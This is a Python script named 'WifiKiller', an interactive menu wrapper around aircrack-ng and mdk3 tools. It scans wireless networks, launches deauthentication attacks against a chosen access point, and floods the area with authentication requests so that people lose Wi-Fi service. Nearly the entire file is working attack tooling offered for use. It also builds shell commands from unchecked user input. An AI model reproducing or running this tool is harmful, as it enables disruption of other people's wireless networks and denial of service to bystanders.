#!/usr/bin/python

import os, sys, threading

wlan = raw_input("Wlan Interface (ex. wlan0): ")
os.system("airmon-ng start " + wlan)
interface = raw_input("Monitor Interface (ex. wlan0mon): ")

os.system("clear")

print("\033[1;31mPlease do not hit ctrl + c to quit. Use the command 'exit'!\033[1;0m")
raw_input("Press enter... ")

def banner():
    os.system("clear")
    print ('''\033[1;32m _    _  _   __  _   _   __ _  _  _
| |  | |(_) / _|(_) | | / /(_)| || |
| |  | | _ | |_  _  | |/ /  _ | || |  ___  _ __
| |/\| || ||  _|| | |    \ | || || | / _ \| '__|
\  /\  /| || |  | | | |\  \| || || ||  __/| |
 \/  \/ |_||_|  |_| \_| \_/|_||_||_| \___||_|\033[1;0m

\033[1;31mWifiKiller v1.0 (c) 2017 - AppPrinter\033[1;0m''')

def scanap():
    os.system("airodump-ng " + interface)
    raw_input("Copy the target BSSID and press enter... ")

def deauth_ap():
    bssid = raw_input("BSSID: ")
    os.system("xterm -e \"mdk3 " + interface + " d -a " + bssid + "\" &")
    os.system("airodump-ng " + interface + " --bssid " + bssid)

    raw_input("Press enter... ")

def auth_dos():
    os.system("xterm -e \"mdk3 " + interface + " a\"")

    raw_input("Press enter... ")

def install_tools():
    os.system("airmon-ng stop " + interface)
    os.system("sudo apt-get install mdk3")
    print("----------------------------------------------")
    os.system("sudo apt-get install aircrack-ng")
    print("----------------------------------------------")
    os.system("sudo apt-get install xterm")
    os.system("airmon-ng start " + wlan)
    raw_input("Press enter... ")

def selection():
    while True:
        os.system("clear")
        banner()

        print ('''
1) Scan For Networks
2) Wifi Jammer [Deauth attack]
3) Wifi Kill Area [Authentication DoS attack]
4) Check Tools
        ''')

        cmd = raw_input("\033[1;36mWifiKiller > \033[1;0m")

        if cmd == "1":
            scanap()
        elif cmd == "2":
            deauth_ap()
        elif cmd == "3":
            auth_dos()
        elif cmd == "4":
            install_tools()
        elif cmd == "exit":
            os.system("airmon-ng stop " + interface)
            exit(0)
        elif cmd == "":
            os.system("") # do nothing
        else:
            print("\033[1;31m" + cmd + ": command not found\033[1;0m")
            print("")
            raw_input("Press enter... ")

hx = threading.Thread(target=selection)
hx.start()
